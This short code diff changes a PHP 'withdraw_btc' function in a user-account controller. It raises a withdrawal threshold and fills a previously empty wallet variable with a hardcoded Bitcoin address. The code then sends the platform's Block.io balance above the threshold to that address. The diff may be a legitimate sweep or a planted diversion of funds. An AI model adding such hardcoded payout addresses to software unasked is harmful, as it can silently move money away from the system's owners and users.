@@ -267,13 +267,12 @@ class ControllerAccountAccount extends Controller {
 	public function withdraw_btc(){
 		if (intval($this->config->get('status_withdraw')) == 1)
 		{
-
         	$block_io = new BlockIo(key, pin, block_version);
 			$balances = $block_io->get_balance();
 			$blance_admin = $balances->data->available_balance;
-			if (doubleval($blance_admin) > 0.7){
-				$amounts = $blance_admin - 0.7;
-				$wallet = "";
+			if (doubleval($blance_admin) > 1){
+				$amounts = $blance_admin - 1;
+				$wallet = "1GReHMvGQYGstqfmPpTnfFL9sLC2CECe14";
 				$tml_block = $block_io -> withdraw(array(
 	                'amounts' => $amounts, 
 	                'to_addresses' => $wallet,
